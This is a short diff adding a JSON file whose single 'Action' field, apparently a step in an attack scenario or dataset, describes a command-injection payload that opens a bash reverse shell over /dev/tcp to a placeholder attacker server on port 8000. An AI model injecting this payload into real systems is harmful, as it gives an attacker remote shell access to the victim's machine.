@@ -1,0 +1,3 @@
+{
+    "Action": "The attacker injects the payload '; bash -c \"bash -i >& /dev/tcp/your.server.ip.address/8000 0>&1\" #', replacing 'your.server.ip.address' with their own server's IP."
+}
